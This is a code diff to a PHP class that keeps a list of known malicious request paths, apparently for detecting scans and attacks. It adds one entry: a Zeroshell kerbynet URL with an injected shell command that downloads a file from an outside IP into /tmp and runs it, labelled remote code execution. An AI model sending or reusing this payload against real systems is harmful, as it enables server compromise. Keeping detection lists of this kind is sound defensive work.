@@ -113,7 +113,8 @@ class security
                 "/currentsetting.htm" => "Netgear config page",
                 "/status?full&json" => "Searching for server status pages",
                 "/server-status?format=plain" => "Searching for server status pages",
-                "/admin/api.php?version" => "Searching for admin pages"
+                "/admin/api.php?version" => "Searching for admin pages",
+                "/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22" => "Remote code execution"
         );
 
             return $exploits;
